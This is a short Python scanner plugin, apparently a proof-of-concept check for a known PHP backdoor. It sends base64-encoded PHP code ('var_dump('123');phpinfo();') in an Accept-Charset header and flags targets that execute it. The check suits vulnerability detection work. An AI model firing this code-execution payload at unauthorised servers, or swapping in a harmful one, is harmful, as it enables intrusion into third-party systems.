#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            url = self.base_url
            async with ClientSession() as session:
                # aiohttp-3.6.1 存在bug，在设置proxy情况下，无法设置Accept-Encoding，且默认Accept-Encoding无法触发此漏洞。
                headers = {
                    'Accept-Encoding': 'gzip,deflate',
                    'Accept-Charset': 'dmFyX2R1bXAoJzEyMycpO3BocGluZm8oKTs=',
                }
                try:
                    async with session.get(url=url, headers=headers) as res:
                        if res:
                            text = str(await res.read())
                            if "string(3) \"" in text:
                                yield url
                except:
                    pass